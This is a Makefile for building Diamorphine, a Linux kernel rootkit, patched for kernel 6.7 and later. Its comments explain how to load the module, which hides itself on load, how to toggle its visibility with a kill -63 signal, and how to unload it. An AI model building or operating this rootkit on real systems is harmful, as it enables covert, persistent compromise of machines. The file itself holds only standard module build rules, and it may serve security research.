# Makefile for Diamorphine (patched for kernel 6.7+)
# Target: 6.17.0-22-generic on Linux Mint 22.3 "Zena"
#
# Usage:
#   make              — build diamorphine.ko
#   make clean        — remove build artefacts
#   sudo insmod diamorphine.ko   — load (module hides itself immediately)
#   sudo kill -63 0              — toggle visibility
#   sudo rmmod diamorphine       — unload (must be visible first)

KVER    ?= $(shell uname -r)
KDIR    := /lib/modules/$(KVER)/build
PWD     := $(shell pwd)

obj-m   := diamorphine.o

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

.PHONY: all clean
